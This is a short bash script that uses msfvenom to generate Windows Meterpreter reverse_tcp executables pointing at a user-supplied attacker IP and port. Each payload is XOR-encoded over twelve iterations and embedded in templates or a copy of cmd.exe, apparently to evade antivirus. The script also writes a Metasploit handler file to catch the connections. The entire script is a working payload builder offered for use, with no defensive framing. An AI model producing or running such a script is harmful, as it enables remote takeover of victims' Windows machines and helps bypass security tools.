#!/bin/bash
if [ "$#" -ne 2 ]; then
    echo "this script expects two arguments"
    echo "please define ip and port of reverse shell host"
    echo "EXAMPLE -- ./create_win_exploit.sh 192.168.75.133 80"
    exit 
fi

reverse_shell="windows/meterpreter/reverse_tcp"
escaped=`echo $reverse_shell | sed -e 's/\//\\\\\//g'`
prefix="shell-05"

echo "======================================="
echo "ip reverse shell = $1"
echo "port reverse shell = $2"
echo "reverse shell = $reverse_shell"
echo ""

echo "======================================="
echo "building standard windows/shell_reverse_tcp"
msfvenom -p $reverse_shell LHOST=$1 LPORT=$2 -e x86/xor_dynamic -i 12 -b "\x00\x0a\x0d" -f exe > $prefix-a.exe
echo ""

echo "======================================="
echo "OPTION 1: using original but compiled version of /usr/share/metasploit-framework/data/templates/src/pe/exe/template.c"
msfvenom -p $reverse_shell LHOST=$1 LPORT=$2 -x template.exe -e x86/xor_dynamic -i 12 -b "\x00\x0a\x0d" -f exe > $prefix-b.exe
echo ""

echo "======================================="
echo "OPTION 2: using slightly changed version of /usr/share/metasploit-framework/data/templates/src/pe/exe/template.c"
msfvenom -p $reverse_shell LHOST=$1 LPORT=$2 -x template1.exe -e x86/xor_dynamic -i 12 -b "\x00\x0a\x0d" -f exe > $prefix-c.exe
echo ""

echo "======================================="
echo "OPTION 3: using cmd.exe from Win10 64 Bit OS"
msfvenom -p $reverse_shell LHOST=$1 LPORT=$2 -x cmd.exe -e x86/xor_dynamic -i 12 -b "\x00\x0a\x0d" -f exe > $prefix-d.exe
echo ""

echo "======================================="
echo "create handler.rc"
cp handler-template.rc handler.rc
sed -i -e "s/SED_LHOST/$1/g" handler.rc
sed -i -e "s/SED_LPORT/$2/g" handler.rc
sed -i -e "s/SED_REVERSE_SHELL/$escaped/g" handler.rc


echo "======================================="
echo "printing handler.rc"
cat handler.rc
